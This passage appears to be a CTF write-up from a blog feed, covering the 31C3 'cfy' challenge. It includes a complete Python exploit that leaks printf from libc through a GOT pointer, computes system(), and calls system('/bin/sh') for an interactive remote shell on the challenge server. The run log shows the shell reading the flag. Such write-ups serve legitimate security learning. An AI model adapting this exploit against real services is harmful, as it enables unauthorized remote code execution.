<p>It gave a lot of possible addresses, and once I thought I had <code>system()</code> but it was the wrong. I chose a reasonble offset to start from (based on libc 2.19) and ran the script. I stumbled upon the following output:</p>

<pre><code>...snip...
85
[!] found possible offset for system(): printf-63665
[!] system @ 0x7f4df0086b2f


Please enter your number: dec: 2803784840145881088
hex: 0x26e90b74ff854800

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit

86
[!] found possible offset for system(): printf-63666
[!] system @ 0x7f4df0086b2e
</code></pre>

<p>At <code>printf-63665</code>, libc indeed has the first few bytes of <code>system()</code>. It started with a <code>00</code> byte, so I decreased the value by one and plugged that value into a script.</p>

<pre><code class="python">#!/usr/bin/python

import struct, time, re, telnetlib, socket

def p(x):
    return struct.pack("L", x)

# leak printf address in libc via GOT pointer
payload = ""
payload += "2\n"
payload += p(0x601020)  # printf@plt
payload += "\n"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))

print s.recv(1025)
s.send(payload)
time.sleep(0.5)
data = s.recv(1000)

PRINTF = -1
print data
m = re.search(r'hex: (.*)', data)
if m:
    PRINTF = m.group(1)

print "[+] found printf: %x" % int(PRINTF, 16)
SYSTEM = int(PRINTF, 16) - 63664
print "[+] system at %x" % int(SYSTEM)

# spam system into buf
payload = ""
payload += "1\n"        
payload += p(SYSTEM)    # address of system() will be stored in buf
payload += p(SYSTEM)    # buf+8
payload += p(SYSTEM)    # buf+16
payload += "\n"

s.send(payload)
print s.recv(200)

payload = ""
payload += "7\n"        # use an address further into buf (parsers+7*16)
payload += "/bin/sh\n"  # because this will overwrite the first few bytes

s.send(payload)         # send payload, causing it to call system('/bin/sh')

t = telnetlib.Telnet()  # interact with spawned shell
t.sock = s
t.interact()
</code></pre>

<p>I ran the script and crossed my fingers:</p>

<pre><code class="bash">bas@tritonal:~/tmp/31c3/cfy$ python exploit.py 
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit


Please enter your number: dec: 140686779126752
hex: 0x7ff4317e93e0

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit

[+] found printf: 7ff4317e93e0
[+] system at 7ff4317d9b30

Please enter your number: 
dec: 0
hex: 0x0

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit

Please enter your number: id
uid=1001(cfy) gid=1001(cfy) groups=1001(cfy)
cat /home/cfy/flag
THANK YOU WARIO!

BUT OUR PRINCESS IS IN
ANOTHER CASTLE!

Login: cfy_pwn // 31C3_G0nna_keep&lt;on&gt;grynding
</code></pre>

<p>So the flag was <code>31C3_G0nna_keep&lt;on&gt;grynding</code>. I thought this was quite tough based on the amount of points&hellip;</p>
]]></content>
  </entry>
  
</feed>
